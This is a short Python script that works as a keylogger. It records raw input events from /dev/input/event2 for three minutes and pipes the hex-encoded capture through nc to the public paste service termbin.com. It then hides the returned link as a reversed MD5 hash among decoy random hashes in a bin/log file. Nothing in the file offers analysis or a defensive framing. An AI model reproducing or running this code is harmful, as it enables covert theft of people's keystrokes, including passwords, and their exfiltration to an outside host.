import subprocess, binascii, hashlib, random, string, time

f = open("/dev/input/event2","rb")
data = ''

rec = time.time()
while time.time() < rec+180:
	data += f.read(24)
f.close()

link = subprocess.Popen('echo {} | nc termbin.com 9999'.format(data.encode('hex')), shell=True, stdout=subprocess.PIPE).communicate()[0][20:-2]
subprocess.call(["mkdir","bin"])

g = open('bin/log','w+')
for i in range(20):
	if i !=10:
		g.write(hashlib.md5(''.join(random.sample(string.ascii_letters, 20))).hexdigest()+'\n')
	else:
		g.write(hashlib.md5(link).hexdigest()[::-1]+'\n')
g.close()
